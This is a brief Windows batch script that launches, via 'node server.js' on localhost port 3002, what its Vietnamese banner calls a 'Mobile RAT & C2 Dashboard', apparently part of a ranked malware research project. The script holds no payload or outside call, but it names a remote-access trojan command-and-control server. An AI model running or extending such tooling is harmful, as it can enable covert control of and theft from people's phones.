@echo off
title Rank 3 - Mobile RAT C2 Research
cd /d "%~dp0rank3_Mobile_RAT"
echo ===================================================
echo [!] Khoi chay Rank 3 (Mobile RAT & C2 Dashboard)
echo [!] Port: http://localhost:3002
echo ===================================================
node server.js
pause
